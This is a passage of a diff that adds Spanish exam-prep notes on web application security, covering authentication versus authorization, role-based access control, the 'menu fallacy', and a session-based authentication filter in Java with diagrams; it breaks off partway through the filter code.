@@ -1,7 +1,1297 @@
 ---
 import BlockLayout from '../layouts/BlockLayout.astro';
-const sections: { id: string; label: string }[] = [];
+const sections = [
+  { id: "intro-seguridad",       label: "Autenticación y autorización" },
+  { id: "rbac",                  label: "Control de acceso por roles" },
+  { id: "falacia-menu",          label: "La falacia del menú" },
+  { id: "autenticacion-sesion",  label: "Auth basada en sesión" },
+  { id: "csrf-xss",              label: "CSRF y XSS" },
+  { id: "seguridad-capas",       label: "Seguridad en todas las capas" },
+  { id: "metodos-autenticacion", label: "Métodos de autenticación" },
+  { id: "seguridad-declarativa", label: "Seguridad declarativa" },
+];
 ---
 <BlockLayout title="Seguridad" blockNumber={5} blockName="Seguridad" sections={sections}>
-  <p>Contenido pendiente.</p>
+
+  <h1>Seguridad</h1>
+  <p class="lead">Autenticación, autorización, sesiones, CSRF, XSS y seguridad por capas</p>
+
+  <!-- ===== SECCIÓN 1: INTRO SEGURIDAD ===== -->
+  <section id="intro-seguridad">
+    <h2>Autenticación y autorización</h2>
+
+    <div class="callout callout-examen">
+      <p>Peso alto. Distinguir autenticación (authn) de autorización (authz) es pregunta teórica clásica. El flujo de cuatro pasos del control de acceso puede aparecer como desarrollo.</p>
+    </div>
+
+    <p>La seguridad de una aplicación web se articula en dos preguntas distintas: <strong>¿quién eres?</strong> (autenticación, authn) y <strong>¿qué puedes hacer?</strong> (autorización, authz). Sin autenticación no hay autorización posible; sin autorización, autenticar no tiene sentido.</p>
+
+    <p>El flujo estándar de control de acceso tiene cuatro pasos: (1) el cliente envía credenciales al servidor, (2) el servidor verifica que el usuario con esas credenciales existe, (3) el servidor determina los roles del usuario, (4) si el rol tiene permiso para la operación, la ejecuta; si no, devuelve 403.</p>
+
+    <p>Los roles controlan operaciones (URLs), pero no datos concretos. Un cliente tiene permiso para consultar pedidos, pero solo los suyos. Este nivel de control requiere lógica adicional en el controlador o servicio: comparar el recurso solicitado con el usuario en sesión.</p>
+
+    <table class="comparison-table">
+      <thead>
+        <tr>
+          <th>Aspecto</th>
+          <th>Autenticación (authn)</th>
+          <th>Autorización (authz)</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>Pregunta</td>
+          <td>¿Quién eres?</td>
+          <td>¿Qué puedes hacer?</td>
+        </tr>
+        <tr>
+          <td>Cuándo ocurre</td>
+          <td>En el primer acceso a un recurso protegido</td>
+          <td>En cada operación protegida</td>
+        </tr>
+        <tr>
+          <td>Mecanismo típico</td>
+          <td>Login + contraseña, token, certificado</td>
+          <td>Roles, permisos, ACLs</td>
+        </tr>
+        <tr>
+          <td>Si falla</td>
+          <td>HTTP 401 Unauthorized</td>
+          <td>HTTP 403 Forbidden</td>
+        </tr>
+        <tr>
+          <td>Responsable en la app</td>
+          <td>Filtro de autenticación</td>
+          <td>Filtro o controlador según la arquitectura</td>
+        </tr>
+        <tr>
+          <td>Controla datos propios</td>
+          <td>No</td>
+          <td>No directamente — lógica en el servicio</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <!-- SVG: Flujo de cuatro pasos del control de acceso -->
+    <svg viewBox="0 0 760 260" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:760px;display:block;margin:var(--space-5) 0;">
+      <defs>
+        <marker id="arrOk" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+          <path d="M0,0 L0,6 L8,3 z" fill="var(--color-accent)"/>
+        </marker>
+        <marker id="arrErr" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+          <path d="M0,0 L0,6 L8,3 z" fill="oklch(55% 0.15 20)"/>
+        </marker>
+        <marker id="arrN" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+          <path d="M0,0 L0,6 L8,3 z" fill="var(--color-text-3)"/>
+        </marker>
+      </defs>
+
+      <!-- Actores -->
+      <text x="60" y="22" text-anchor="middle" font-family="var(--font-display)" font-size="12" font-weight="600" fill="var(--color-text-2)">Cliente</text>
+      <line x1="60" y1="28" x2="60" y2="255" stroke="var(--color-border)" stroke-width="1" stroke-dasharray="4,3"/>
+
+      <text x="240" y="22" text-anchor="middle" font-family="var(--font-display)" font-size="12" font-weight="600" fill="var(--color-text-2)">Filtro Auth</text>
+      <line x1="240" y1="28" x2="240" y2="255" stroke="var(--color-border)" stroke-width="1" stroke-dasharray="4,3"/>
+
+      <text x="430" y="22" text-anchor="middle" font-family="var(--font-display)" font-size="12" font-weight="600" fill="var(--color-text-2)">Servicio Login</text>
+      <line x1="430" y1="28" x2="430" y2="255" stroke="var(--color-border)" stroke-width="1" stroke-dasharray="4,3"/>
+
+      <text x="640" y="22" text-anchor="middle" font-family="var(--font-display)" font-size="12" font-weight="600" fill="var(--color-text-2)">Recurso</text>
+      <line x1="640" y1="28" x2="640" y2="255" stroke="var(--color-border)" stroke-width="1" stroke-dasharray="4,3"/>
+
+      <!-- Fase A: sesión activa -->
+      <text x="8" y="52" font-family="var(--font-display)" font-size="9" fill="var(--color-text-3)">SÍ sesión</text>
+      <line x1="60" y1="58" x2="238" y2="58" stroke="var(--color-text-3)" stroke-width="1.5" marker-end="url(#arrN)"/>
+      <text x="149" y="52" text-anchor="middle" font-family="var(--font-mono)" font-size="9" fill="var(--color-text-3)">GET /area-privada</text>
+      <!-- rombo sesión activa -->
+      <polygon points="240,68 258,78 240,88 222,78" fill="var(--color-surface-2)" stroke="var(--color-border-strong)" stroke-width="1.5"/>
+      <text x="240" y="82" text-anchor="middle" font-family="var(--font-display)" font-size="8" fill="var(--color-text-2)">Sesión?</text>
+      <!-- Rama SÍ → Recurso -->
+      <line x1="258" y1="78" x2="638" y2="78" stroke="var(--color-accent)" stroke-width="1.5" marker-end="url(#arrOk)"/>
+      <text x="448" y="72" text-anchor="middle" font-family="var(--font-display)" font-size="9" fill="var(--color-accent)">SÍ → chain.doFilter()</text>
+      <line x1="640" y1="88" x2="62" y2="105" stroke="var(--color-accent)" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#arrOk)"/>
+      <text x="380" y="102" text-anchor="middle" font-family="var(--font-display)" font-size="9" fill="var(--color-accent)">200 OK</text>
+
+      <!-- Separador fases -->
+      <line x1="0" y1="118" x2="760" y2="118" stroke="var(--color-border)" stroke-width="1" stroke-dasharray="6,4"/>
+      <text x="8" y="115" font-family="var(--font-display)" font-size="9" fill="var(--color-text-3)">NO sesión</text>
+
+      <!-- Fase B: sin sesión -->
+      <line x1="60" y1="130" x2="238" y2="130" stroke="var(--color-text-3)" stroke-width="1.5" marker-end="url(#arrN)"/>
+      <text x="149" y="124" text-anchor="middle" font-family="var(--font-mono)" font-size="9" fill="var(--color-text-3)">GET /area-privada</text>
+      <polygon points="240,140 258,150 240,160 222,150" fill="var(--color-surface-2)" stroke="var(--color-border-strong)" stroke-width="1.5"/>
+      <text x="240" y="154" text-anchor="middle" font-family="var(--font-display)" font-size="8" fill="var(--color-text-2)">Sesión?</text>
+      <!-- Rama NO → cliente redirect -->
+      <line x1="222" y1="150" x2="62" y2="168" stroke="oklch(55% 0.15 20)" stroke-width="1.5" marker-end="url(#arrErr)"/>
+      <text x="140" y="165" text-anchor="middle" font-family="var(--font-display)" font-size="9" fill="oklch(55% 0.15 20)">NO → 302 /login</text>
+
+      <!-- Login -->
+      <line x1="60" y1="180" x2="428" y2="180" stroke="var(--color-text-3)" stroke-width="1.5" marker-end="url(#arrN)"/>
+      <text x="244" y="174" text-anchor="middle" font-family="var(--font-mono)" font-size="9" fill="var(--color-text-3)">POST /login &#123;user,pwd&#125;</text>
+      <polygon points="430,190 448,200 430,210 412,200" fill="var(--color-surface-2)" stroke="var(--color-border-strong)" stroke-width="1.5"/>
+      <text x="430" y="204" text-anchor="middle" font-family="var(--font-display)" font-size="8" fill="var(--color-text-2)">Válido?</text>
+      <!-- OK branch -->
+      <line x1="448" y1="200" x2="638" y2="200" stroke="var(--color-accent)" stroke-width="1.5" marker-end="url(#arrOk)"/>
+      <text x="543" y="194" text-anchor="middle" font-family="var(--font-display)" font-size="9" fill="var(--color-accent)">OK → session + 302</text>
+      <!-- FAIL branch -->
+      <line x1="430" y1="210" x2="62" y2="228" stroke="oklch(55% 0.15 20)" stroke-width="1.5" marker-end="url(#arrErr)"/>
+      <text x="240" y="228" text-anchor="middle" font-family="var(--font-display)" font-size="9" fill="oklch(55% 0.15 20)">FAIL → 302 /login?error=1</text>
+    </svg>
+
+    <div class="callout callout-key">
+      <p>La autenticación verifica identidad; la autorización verifica permisos. Un usuario puede estar autenticado y aun así recibir un 403 si no tiene el rol necesario para esa operación.</p>
+    </div>
+  </section>
+
+  <!-- ===== SECCIÓN 2: RBAC ===== -->
+  <section id="rbac">
+    <h2>Control de acceso por roles (RBAC)</h2>
+
+    <div class="callout callout-examen">
+      <p>Peso medio. RBAC como patrón conceptual: usuarios → roles → permisos. Puede aparecer como contexto de una pregunta de arquitectura de seguridad.</p>
+    </div>
+
+    <p>Role Based Access Control asigna permisos a roles, y roles a usuarios. En lugar de gestionar qué puede hacer cada usuario individualmente, se modifica el rol y el cambio se propaga a todos los usuarios con ese rol.</p>
+
+    <p>En la web, permisos son URLs: controlar qué roles pueden acceder a qué URL equivale a controlar qué operaciones puede ejecutar cada tipo de usuario. Esto es lo que implementan los filtros de autenticación y los <code>security-constraint</code> del contenedor.</p>
+
+    <!-- SVG: Diagrama RBAC -->
+    <svg viewBox="0 0 680 300" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:680px;display:block;margin:var(--space-5) 0;">
+      <defs>
+        <marker id="arrRbac" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto">
+          <path d="M0,0 L0,6 L7,3 z" fill="var(--color-border-strong)"/>
+        </marker>
+      </defs>
+
+      <!-- Cabeceras columnas -->
+      <text x="90"  y="20" text-anchor="middle" font-family="var(--font-display)" font-size="12" font-weight="600" fill="var(--color-text-2)">Usuarios</text>
+      <text x="310" y="20" text-anchor="middle" font-family="var(--font-display)" font-size="12" font-weight="600" fill="var(--color-text-2)">Roles</text>
+      <text x="555" y="20" text-anchor="middle" font-family="var(--font-display)" font-size="12" font-weight="600" fill="var(--color-text-2)">Permisos</text>
+
+      <!-- Usuarios -->
+      <rect x="20"  y="35" width="140" height="36" rx="6" fill="var(--color-surface)" stroke="var(--color-border)" stroke-width="1.5"/>
+      <text x="90"  y="57" text-anchor="middle" font-family="var(--font-mono)" font-size="11" fill="var(--color-text)">admin</text>
+
+      <rect x="20"  y="85" width="140" height="36" rx="6" fill="var(--color-surface)" stroke="var(--color-border)" stroke-width="1.5"/>
+      <text x="90"  y="107" text-anchor="middle" font-family="var(--font-mono)" font-size="11" fill="var(--color-text)">cliente1</text>
+
+      <rect x="20"  y="135" width="140" height="36" rx="6" fill="var(--color-surface)" stroke="var(--color-border)" stroke-width="1.5"/>
+      <text x="90"  y="157" text-anchor="middle" font-family="var(--font-mono)" font-size="11" fill="var(--color-text)">gestor</text>
+
+      <!-- Roles -->
+      <rect x="220" y="35"  width="180" height="36" rx="6" fill="var(--color-accent-light)" stroke="var(--color-accent)" stroke-width="1.5"/>
+      <text x="310" y="57"  text-anchor="middle" font-family="var(--font-display)" font-size="11" font-weight="600" fill="var(--color-accent)">Administrador</text>
+
+      <rect x="220" y="85"  width="180" height="36" rx="6" fill="var(--color-accent-light)" stroke="var(--color-accent)" stroke-width="1.5"/>
+      <text x="310" y="107" text-anchor="middle" font-family="var(--font-display)" font-size="11" font-weight="600" fill="var(--color-accent)">Cliente</text>
+
+      <rect x="220" y="135" width="180" height="36" rx="6" fill="var(--color-accent-light)" stroke="var(--color-accent)" stroke-width="1.5"/>
+      <text x="310" y="157" text-anchor="middle" font-family="var(--font-display)" font-size="11" font-weight="600" fill="var(--color-accent)">Gestor productos</text>
+
+      <rect x="220" y="185" width="180" height="36" rx="6" fill="var(--color-accent-light)" stroke="var(--color-accent)" stroke-width="1.5"/>
+      <text x="310" y="207" text-anchor="middle" font-family="var(--font-display)" font-size="11" font-weight="600" fill="var(--color-accent)">Gestor pedidos</text>
+
+      <!-- Permisos -->
+      <rect x="470" y="35"  width="170" height="32" rx="4" fill="var(--color-surface-2)" stroke="var(--color-border)" stroke-width="1"/>
+      <text x="555" y="55"  text-anchor="middle" font-family="var(--font-display)" font-size="10" fill="var(--color-text-2)">Ver productos</text>
+
+      <rect x="470" y="80"  width="170" height="32" rx="4" fill="var(--color-surface-2)" stroke="var(--color-border)" stroke-width="1"/>
+      <text x="555" y="100" text-anchor="middle" font-family="var(--font-display)" font-size="10" fill="var(--color-text-2)">Ver pedidos propios</text>
+
+      <rect x="470" y="125" width="170" height="32" rx="4" fill="var(--color-surface-2)" stroke="var(--color-border)" stroke-width="1"/>
+      <text x="555" y="145" text-anchor="middle" font-family="var(--font-display)" font-size="10" fill="var(--color-text-2)">Crear pedido</text>
+
+      <rect x="470" y="170" width="170" height="32" rx="4" fill="var(--color-surface-2)" stroke="var(--color-border)" stroke-width="1"/>
+      <text x="555" y="190" text-anchor="middle" font-family="var(--font-display)" font-size="10" fill="var(--color-text-2)">Gestionar productos</text>
+
+      <rect x="470" y="215" width="170" height="32" rx="4" fill="var(--color-surface-2)" stroke="var(--color-border)" stroke-width="1"/>
+      <text x="555" y="235" text-anchor="middle" font-family="var(--font-display)" font-size="10" fill="var(--color-text-2)">Gestionar pedidos</text>
+
+      <!-- Flechas: usuarios → roles -->
+      <line x1="160" y1="53"  x2="218" y2="53"  stroke="var(--color-border-strong)" stroke-width="1.2" marker-end="url(#arrRbac)"/>
+      <line x1="160" y1="103" x2="218" y2="103" stroke="var(--color-border-strong)" stroke-width="1.2" marker-end="url(#arrRbac)"/>
+      <line x1="160" y1="153" x2="218" y2="158" stroke="var(--color-border-strong)" stroke-width="1.2" marker-end="url(#arrRbac)"/>
+      <line x1="160" y1="153" x2="218" y2="200" stroke="var(--color-border-strong)" stroke-width="1.2" marker-end="url(#arrRbac)"/>
+
+      <!-- Flechas: roles → permisos -->
+      <!-- Admin → todos -->
+      <line x1="400" y1="53"  x2="468" y2="51"  stroke="var(--color-border-strong)" stroke-width="1" marker-end="url(#arrRbac)"/>
+      <line x1="400" y1="53"  x2="468" y2="96"  stroke="var(--color-border-strong)" stroke-width="1" marker-end="url(#arrRbac)"/>
+      <line x1="400" y1="53"  x2="468" y2="141" stroke="var(--color-border-strong)" stroke-width="1" marker-end="url(#arrRbac)"/>
+      <line x1="400" y1="53"  x2="468" y2="186" stroke="var(--color-border-strong)" stroke-width="1" marker-end="url(#arrRbac)"/>
+      <line x1="400" y1="53"  x2="468" y2="231" stroke="var(--color-border-strong)" stroke-width="1" marker-end="url(#arrRbac)"/>
+      <!-- Cliente → 3 primeros -->
+      <line x1="400" y1="103" x2="468" y2="51"  stroke="var(--color-border-strong)" stroke-width="1" marker-end="url(#arrRbac)"/>
+      <line x1="400" y1="103" x2="468" y2="96"  stroke="var(--color-border-strong)" stroke-width="1" marker-end="url(#arrRbac)"/>
+      <line x1="400" y1="103" x2="468" y2="141" stroke="var(--color-border-strong)" stroke-width="1" marker-end="url(#arrRbac)"/>
+      <!-- Gestor productos -->
+      <line x1="400" y1="153" x2="468" y2="186" stroke="var(--color-border-strong)" stroke-width="1" marker-end="url(#arrRbac)"/>
+      <!-- Gestor pedidos -->
+      <line x1="400" y1="203" x2="468" y2="231" stroke="var(--color-border-strong)" stroke-width="1" marker-end="url(#arrRbac)"/>
+    </svg>
+
+    <div class="callout callout-warning">
+      <p>RBAC protege operaciones (URLs) pero no datos concretos. Que un cliente tenga rol <code>cliente</code> le da permiso para consultar pedidos, pero el controlador debe verificar además que el pedido pertenece a ese cliente. No basta con el rol.</p>
+    </div>
+
+    <div class="callout callout-tip">
+      <p>Lo que se guarda en sesión determina cómo se recupera. Si el login guarda el objeto completo <code>session.setAttribute("user", usuario)</code>, recuperarlo requiere un cast: <code>(Usuario) session.getAttribute("user")</code>. Alternativamente, se puede guardar solo el username como String para simplificar.</p>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">java</div>
+<pre><code>// En el controlador de detalle de pedido
+Pedido pedido = pedidoService.findById(id);
+
+// Recuperar el usuario de sesión (se guarda como objeto Usuario en el login)
+Usuario usuarioSesion = (Usuario) session.getAttribute("user");
+
+// Verificar que el pedido pertenece al usuario autenticado
+if (!pedido.getCliente().getUsername().equals(usuarioSesion.getUsername())) &#123;
+    response.sendError(403);  // autenticado pero no autorizado a ver este pedido
+    return;
+&#125;
+// Solo si pasó la comprobación → continuar con la vista</code></pre>
+    </div>
+  </section>
+
+  <!-- ===== SECCIÓN 3: FALACIA DEL MENÚ ===== -->
+  <section id="falacia-menu">
+    <h2>La falacia del menú de usuario</h2>
+
+    <div class="callout callout-examen">
+      <p>Peso medio-alto. Concepto importante que el profesor cita como motivación del filtro de autenticación. Puede aparecer como introducción de una pregunta práctica.</p>
+    </div>
+
+    <p>Si al usuario solo se le muestran las opciones que puede usar, parece que la aplicación está protegida. Esto es la <strong>"falacia del menú de usuario"</strong>.</p>
+
+    <p>El problema: el usuario puede conocer o descubrir las URLs de operaciones que no aparecen en su menú y escribirlas directamente en la barra del navegador. HTTP no requiere que el usuario haga clic en un enlace; cualquier URL puede invocarse directamente.</p>
+
+    <p>El menú es UX. La autorización es seguridad. Son capas distintas y ninguna sustituye a la otra. Cada endpoint del servidor debe verificar permisos antes de ejecutar, independientemente de si esa URL aparece en la interfaz.</p>
+
+    <!-- SVG: La falacia del menú -->
+    <svg viewBox="0 0 700 240" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:700px;display:block;margin:var(--space-5) 0;">
+      <defs>
+        <marker id="arrMenu" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+          <path d="M0,0 L0,6 L8,3 z" fill="var(--color-text-3)"/>
+        </marker>
+        <marker id="arrMenuOk" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+          <path d="M0,0 L0,6 L8,3 z" fill="var(--color-accent)"/>
+        </marker>
+        <marker id="arrMenuErr" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+          <path d="M0,0 L0,6 L8,3 z" fill="oklch(55% 0.15 20)"/>
+        </marker>
+      </defs>
+
+      <!-- Separador vertical -->
+      <line x1="350" y1="10" x2="350" y2="215" stroke="var(--color-border)" stroke-width="1"/>
+
+      <!-- Panel izquierdo: lo que ve el usuario -->
+      <text x="175" y="25" text-anchor="middle" font-family="var(--font-display)" font-size="12" font-weight="600" fill="var(--color-text-2)">Lo que ve el usuario</text>
+
+      <rect x="60" y="38" width="230" height="100" rx="6" fill="var(--color-surface)" stroke="var(--color-border)" stroke-width="1.5"/>
+      <text x="175" y="58" text-anchor="middle" font-family="var(--font-display)" font-size="10" font-weight="600" fill="var(--color-text-3)">MENÚ</text>
+      <rect x="72" y="64" width="206" height="22" rx="3" fill="var(--color-surface-2)"/>
+      <text x="175" y="79" text-anchor="middle" font-family="var(--font-body)" font-size="10" fill="var(--color-text)">Ver mis pedidos</text>
+      <rect x="72" y="90" width="206" height="22" rx="3" fill="var(--color-surface-2)"/>
+      <text x="175" y="105" text-anchor="middle" font-family="var(--font-body)" font-size="10" fill="var(--color-text)">Mi perfil</text>
+      <rect x="72" y="116" width="206" height="16" rx="3" fill="var(--color-surface-2)"/>
+      <text x="175" y="128" text-anchor="middle" font-family="var(--font-body)" font-size="10" fill="var(--color-text)">Cerrar sesión</text>
+
+      <!-- Badge verde -->
+      <rect x="120" y="150" width="110" height="22" rx="4" fill="var(--color-tip-bg)" stroke="var(--color-tip-border)" stroke-width="1"/>
+      <text x="175" y="164" text-anchor="middle" font-family="var(--font-display)" font-size="9" font-weight="600" fill="var(--color-tip-text)">Solo sus opciones</text>
+
+      <!-- Panel derecho: lo que puede intentar -->
+      <text x="525" y="25" text-anchor="middle" font-family="var(--font-display)" font-size="12" font-weight="600" fill="var(--color-text-2)">Lo que puede intentar</text>
+
+      <!-- Input URL -->
+      <rect x="370" y="38" width="310" height="28" rx="4" fill="var(--color-surface)" stroke="var(--color-border-strong)" stroke-width="1.5"/>
+      <text x="525" y="56" text-anchor="middle" font-family="var(--font-mono)" font-size="9" fill="var(--color-text-2)">https://app.com/admin/usuarios</text>
+
+      <line x1="525" y1="66" x2="525" y2="90" stroke="var(--color-text-3)" stroke-width="1.5" marker-end="url(#arrMenu)"/>
+
+      <!-- Caja servidor -->
+      <rect x="410" y="92" width="230" height="38" rx="6" fill="var(--color-surface-2)" stroke="var(--color-border)" stroke-width="1.5"/>
+      <text x="525" y="107" text-anchor="middle" font-family="var(--font-display)" font-size="10" font-weight="600" fill="var(--color-text)">Servidor</text>
+      <text x="525" y="122" text-anchor="middle" font-family="var(--font-display)" font-size="10" fill="var(--color-text-2)">¿Tiene rol admin?</text>
+
+      <!-- Ramas SÍ/NO -->
+      <line x1="480" y1="130" x2="430" y2="156" stroke="var(--color-accent)" stroke-width="1.5" marker-end="url(#arrMenuOk)"/>
+      <text x="448" y="148" font-family="var(--font-display)" font-size="9" fill="var(--color-accent)">SÍ</text>
+      <rect x="370" y="158" width="70" height="24" rx="4" fill="var(--color-tip-bg)" stroke="var(--color-tip-border)" stroke-width="1"/>
+      <text x="405" y="174" text-anchor="middle" font-family="var(--font-display)" font-size="9" font-weight="600" fill="var(--color-tip-text)">Ejecuta</text>
+
+      <line x1="570" y1="130" x2="610" y2="156" stroke="oklch(55% 0.15 20)" stroke-width="1.5" marker-end="url(#arrMenuErr)"/>
+      <text x="595" y="148" font-family="var(--font-display)" font-size="9" fill="oklch(55% 0.15 20)">NO</text>
+      <rect x="575" y="158" width="100" height="24" rx="4" fill="var(--color-warning-bg)" stroke="var(--color-warning-border)" stroke-width="1"/>
+      <text x="625" y="174" text-anchor="middle" font-family="var(--font-display)" font-size="9" font-weight="600" fill="var(--color-warning-text)">403 Forbidden</text>
+
+      <!-- Nota -->
+      <text x="350" y="228" text-anchor="middle" font-family="var(--font-body)" font-size="10" fill="var(--color-text-2)">El menú oculta opciones por UX. El servidor deniega por seguridad. Son cosas distintas.</text>
+    </svg>
+
+    <div class="callout callout-key">
+      <p>Cada operación del servidor debe comprobar SIEMPRE que el usuario tiene permiso antes de ejecutarla. La interfaz oculta opciones para mejorar la experiencia, no para garantizar seguridad.</p>
+    </div>
+  </section>
+
+  <!-- ===== SECCIÓN 4: AUTENTICACIÓN BASADA EN SESIÓN ===== -->
+  <section id="autenticacion-sesion">
+    <h2>Autenticación basada en sesión</h2>
+
+    <div class="callout callout-examen">
+      <p>Peso MUY ALTO. El filtro de autenticación de P5 es el ejemplo más mencionado por el profesor. Es ejercicio muy probable en el examen. Dominar el flujo completo: login → filtro intercepta → guarda returnUrl → redirect a login → credenciales verificadas → sesión creada → redirect a destino → logout invalida sesión.</p>
+    </div>
+
+    <p>La autenticación basada en sesión es el mecanismo implementado en P5 y P6. Se apoya en las sesiones HTTP de Servlets para mantener el estado del usuario autenticado entre peticiones. Hay tres actores que trabajan en coordinación: el formulario de login, el servicio que verifica credenciales, y el filtro que intercepta cada petición a recursos protegidos.</p>
+
+    <!-- SVG: Flujo completo de autenticación basada en sesión -->
+    <svg viewBox="0 0 820 420" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:820px;display:block;margin:var(--space-5) 0;">
+      <defs>
+        <marker id="arrSesOk" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+          <path d="M0,0 L0,6 L8,3 z" fill="var(--color-accent)"/>
+        </marker>
+        <marker id="arrSesErr" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+          <path d="M0,0 L0,6 L8,3 z" fill="oklch(55% 0.15 20)"/>
+        </marker>
+        <marker id="arrSesN" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+          <path d="M0,0 L0,6 L8,3 z" fill="var(--color-text-3)"/>
+        </marker>
+      </defs>
+
+      <!-- Actores -->
+      <text x="80"  y="22" text-anchor="middle" font-family="var(--font-display)" font-size="12" font-weight="600" fill="var(--color-text-2)">Navegador</text>
+      <line x1="80"  y1="28" x2="80"  y2="415" stroke="var(--color-border)" stroke-width="1" stroke-dasharray="4,3"/>
+      <text x="340" y="22" text-anchor="middle" font-family="var(--font-display)" font-size="12" font-weight="600" fill="var(--color-text-2)">AuthFilter</text>
+      <line x1="340" y1="28" x2="340" y2="415" stroke="var(--color-border)" stroke-width="1" stroke-dasharray="4,3"/>
+      <text x="620" y="22" text-anchor="middle" font-family="var(--font-display)" font-size="12" font-weight="600" fill="var(--color-text-2)">LoginController/Service</text>
+      <line x1="620" y1="28" x2="620" y2="415" stroke="var(--color-border)" stroke-width="1" stroke-dasharray="4,3"/>
+
+      <!-- Fase 1 fondo -->
+      <rect x="0" y="30" width="820" height="128" rx="0" fill="oklch(97% 0.03 85 / 0.3)"/>
+      <text x="8" y="48" font-family="var(--font-display)" font-size="9" font-weight="600" fill="var(--color-warning-text)">FASE 1 — Acceso denegado</text>
+
+      <line x1="80" y1="58" x2="338" y2="58" stroke="var(--color-text-3)" stroke-width="1.5" marker-end="url(#arrSesN)"/>
+      <text x="209" y="52" text-anchor="middle" font-family="var(--font-mono)" font-size="9" fill="var(--color-text-3)">GET /area-clientes/pedidos</text>
+
+      <rect x="272" y="64" width="136" height="30" rx="4" fill="var(--color-surface-2)" stroke="var(--color-border)" stroke-width="1"/>
+      <text x="340" y="83" text-anchor="middle" font-family="var(--font-mono)" font-size="8" fill="var(--color-text-2)">getAttribute("user") == null</text>
+
+      <text x="352" y="108" font-family="var(--font-display)" font-size="8" fill="var(--color-text-3)">getSession(false) — NO crear sesión nueva</text>
+      <text x="352" y="120" font-family="var(--font-display)" font-size="8" fill="var(--color-text-3)">session.setAttribute("returnUrl", uri)</text>
+
+      <line x1="338" y1="135" x2="82" y2="135" stroke="oklch(55% 0.15 20)" stroke-width="1.5" marker-end="url(#arrSesErr)"/>
+      <text x="209" y="129" text-anchor="middle" font-family="var(--font-display)" font-size="9" fill="oklch(55% 0.15 20)">302 → /login</text>
+
+      <!-- Fase 2 fondo -->
+      <rect x="0" y="162" width="820" height="140" rx="0" fill="var(--color-surface-2)"/>
+      <text x="8" y="178" font-family="var(--font-display)" font-size="9" font-weight="600" fill="var(--color-text-3)">FASE 2 — Login</text>
+
+      <line x1="80" y1="188" x2="618" y2="188" stroke="var(--color-text-3)" stroke-width="1.5" marker-end="url(#arrSesN)"/>
+      <text x="349" y="182" text-anchor="middle" font-family="var(--font-mono)" font-size="9" fill="var(--color-text-3)">POST /login &#123;username, password&#125;</text>
+
+      <rect x="550" y="194" width="140" height="26" rx="4" fill="var(--color-surface)" stroke="var(--color-border)" stroke-width="1"/>
+      <text x="620" y="211" text-anchor="middle" font-family="var(--font-mono)" font-size="8" fill="var(--color-text-2)">findByCredentials(...)</text>
+
+      <!-- OK -->
+      <line x1="618" y1="224" x2="82" y2="248" stroke="var(--color-accent)" stroke-width="1.5" marker-end="url(#arrSesOk)"/>
+      <text x="349" y="238" text-anchor="middle" font-family="var(--font-display)" font-size="9" fill="var(--color-accent)">OK: session.setAttribute("user") → 302 → returnUrl</text>
+
+      <!-- FAIL -->
+      <line x1="618" y1="258" x2="82" y2="290" stroke="oklch(55% 0.15 20)" stroke-width="1.5" marker-end="url(#arrSesErr)"/>
+      <text x="349" y="282" text-anchor="middle" font-family="var(--font-display)" font-size="9" fill="oklch(55% 0.15 20)">FAIL: 302 → /login?error=1</text>
+
+      <!-- Fase 3 fondo -->
+      <rect x="0" y="305" width="820" height="108" rx="0" fill="oklch(97% 0.03 155 / 0.3)"/>
+      <text x="8" y="322" font-family="var(--font-display)" font-size="9" font-weight="600" fill="var(--color-tip-text)">FASE 3 — Acceso concedido</text>
+
+      <line x1="80" y1="332" x2="338" y2="332" stroke="var(--color-text-3)" stroke-width="1.5" marker-end="url(#arrSesN)"/>
+      <text x="209" y="326" text-anchor="middle" font-family="var(--font-mono)" font-size="9" fill="var(--color-text-3)">GET /area-clientes/pedidos</text>
+
+      <rect x="272" y="338" width="136" height="26" rx="4" fill="var(--color-surface)" stroke="var(--color-border)" stroke-width="1"/>
+      <text x="340" y="355" text-anchor="middle" font-family="var(--font-mono)" font-size="8" fill="var(--color-text)">getAttribute("user") != null</text>
+
+      <line x1="340" y1="366" x2="618" y2="366" stroke="var(--color-accent)" stroke-width="1.5" marker-end="url(#arrSesOk)"/>
+      <text x="479" y="360" text-anchor="middle" font-family="var(--font-display)" font-size="9" fill="var(--color-accent)">chain.doFilter(req, resp)</text>
+
+      <line x1="618" y1="376" x2="82" y2="395" stroke="var(--color-accent)" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#arrSesOk)"/>
+      <text x="349" y="393" text-anchor="middle" font-family="var(--font-display)" font-size="9" fill="var(--color-accent)">200 OK + HTML</text>
+    </svg>
+
+    <h3>El filtro de autenticación</h3>
+
+    <div class="code-block">
+      <div class="code-header">java</div>
+<pre><code>@WebFilter("/area-clientes/*")   // protege todo el área de clientes
+public class AuthFilter implements Filter &#123;
+
+    @Override
+    public void doFilter(ServletRequest req, ServletResponse resp,
+                         FilterChain chain)
+            throws IOException, ServletException &#123;
+
+        var request  = (HttpServletRequest)  req;
+        var response = (HttpServletResponse) resp;
+
+        // getSession(false) — NO crear sesión si no existe; evita sesiones vacías
+        HttpSession session = request.getSession(false);
+        Object usuario = (session != null) ? session.getAttribute("user") : null;
+
+        if (usuario == null) &#123;
+            // Sin sesión activa → guardar URL de retorno y redirigir al login
+            var newSession = request.getSession(true);  // ahora sí crear sesión
+            newSession.setAttribute("returnUrl", request.getRequestURI());
+            response.sendRedirect(request.getContextPath() + "/login");
+            return;  // IMPORTANTE: no llamar a chain.doFilter después de un redirect
+        &#125;
+
+        // Sesión válida → continuar la cadena hacia el recurso solicitado
+        chain.doFilter(request, response);
+    &#125;
